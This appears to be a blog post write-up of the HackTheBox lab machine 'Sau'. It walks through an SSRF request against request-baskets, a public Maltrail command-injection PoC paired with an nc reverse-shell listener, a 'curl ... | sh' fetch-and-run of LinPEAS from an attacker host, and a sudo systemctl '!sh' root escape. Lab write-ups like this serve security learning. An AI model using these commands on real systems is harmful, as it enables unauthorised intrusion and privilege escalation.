@@ -1,0 +1,179 @@
+---
+title: "Sau"
+publishedAt: "2024-10-11"
+image: "/images/blog/sau/htb_sau.jpg"
+summary: "A writeup detailing the exploitation of a HackTheBox machine named 'Sau'. The writeup covers the discovery and exploitation of a Server-Side Request Forgery (SSRF) vulnerability in a service running on port 55555, which leads to the identification of Maltrail v0.53 running internally. The writeup then demonstrates how to leverage a known command execution vulnerability in Maltrail to gain initial access as the 'puma' user. Finally, it shows how to escalate privileges to root by exploiting sudo permissions on the systemctl binary."
+tag: "HackTheBox"
+---
+
+## Initial Reconnaissance
+
+First, we initiate a scan of open ports:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'nmap -sC -sV [BOX_IP]',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+This reveals an exposed service at `http://[BOX_IP]:55555/`. Another service is detected on port 80, but it remains inaccessible to us.
+
+Access the URL from your browser to observe the app version is 1.2.1.
+
+## Exploiting the SSRF Vulnerability
+
+A quick Google search reveals that this version is vulnerable to Server Side Request Forgery (SSRF) on the `/api/baskets/{baskets_name}` endpoint.
+
+We proceed to trigger the SSRF to extract information from the inaccessible port 80:
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: `curl -L 'http://[BOX_IP]:55555/api/baskets/idklol' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'`,
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+By accessing `http://[BOX_IP]:55555/idklol`, we obtain the leaked webpage which uses Maltrail v0.53.
+
+## OS Command Execution Exploit
+
+Another Google search for "Maltrail v0.53 exploit" reveals it is also vulnerable to OS command execution. 
+
+Referencing this PoC: https://github.com/spookier/Maltrail-v0.53-Exploit, we note that the login page is needed to exploit the "username" field. 
+
+To address this, we modify our first vulnerability to redirect traffic to the `/login` endpoint:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: `curl -L 'http://[BOX_IP]:55555/api/baskets/idklmao' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/login", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'`,
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+We then execute the following command to obtain a session as the user "puma":
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: `nc -lvnp [YOUR_PORT]
+python3 exploit.py [YOUR_IP] [YOUR_PORT] http://[BOX_IP]:55555/idklmao`,
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+The user flag can be found at `/home/puma/user.txt`. We now need to escalate our privileges.
+
+## Privilege Escalation with LinPEAS
+
+To begin, we run LinPEAS, a Linux enumeration tool. Download it from the latest release on GitHub: https://github.com/carlospolop/PEASS-ng/releases/latest and move it into a separate folder.
+
+In order to transfer it to the box, we establish a python server within the directory containing `LinPEAS.sh`:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'sudo python3 -m http.server 80',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+Inside the box, we use `curl` to download it:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'curl http://[YOUR_IP]/linpeas.sh | sh',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Despite multiple attempts trying out things with LinPEAS output, I didn't find a way to get root at first.
+
+## Exploiting Sudo Permissions
+
+After some search, we identify a path to privilege escalation through LinPEAS output:
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: `╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service`,
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+This indicates that the user has the ability to execute `sudo /usr/bin/systemctl status trail.service`, which triggers a "less" command page style. 
+
+Looking at https://gtfobins.github.io/gtfobins/systemctl/, we learn that: "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate, or maintain privileged access."
+
+If we trigger the command as sudo, our privileges will be maintained when gaining another shell. 
+Following the instructions in point c) inside gtfobins, we execute:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'sudo /usr/bin/systemctl status trail.service',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Then type:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: '!sh',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+This provides another shell. We verify our privileges:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'whoami',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+This should output `root`, indicating that we have root-level privileges. 
+
+The flag can be found under `/root/root.txt`.
+
+Happy rooting :)
